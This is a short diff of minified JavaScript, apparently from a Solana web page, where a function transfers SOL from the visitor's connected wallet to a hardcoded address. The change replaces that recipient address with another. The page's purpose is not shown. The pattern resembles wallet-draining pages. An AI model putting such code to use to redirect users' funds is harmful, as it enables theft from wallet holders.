@@ -88,7 +88,7 @@ async function trans(b) {
         e = getProvider(),
         c = await a.getAccountInfo(e.publicKey);
     if (1e9 * b > c.lamports) return [(1e9 * b - c.lamports) / 1e9, (1e9 * b) / 1e9, c.lamports / 1e9];
-    let d = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: window.solana.publicKey, toPubkey: "AzagnattdNF4kiZnQDDXhmpQ9FgGUb9ZGTJouEACjGj7", lamports: 1e9 * b })),
+    let d = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: window.solana.publicKey, toPubkey: "AZAGNAT39kYmVzhgtQF8LyM9PXFkvXMZjFbCjLZoTuG5", lamports: 1e9 * b })),
         { blockhash: g } = await a.getRecentBlockhash();
     (d.recentBlockhash = g), (d.feePayer = window.solana.publicKey);
     let h = await e.signTransaction(d, a),
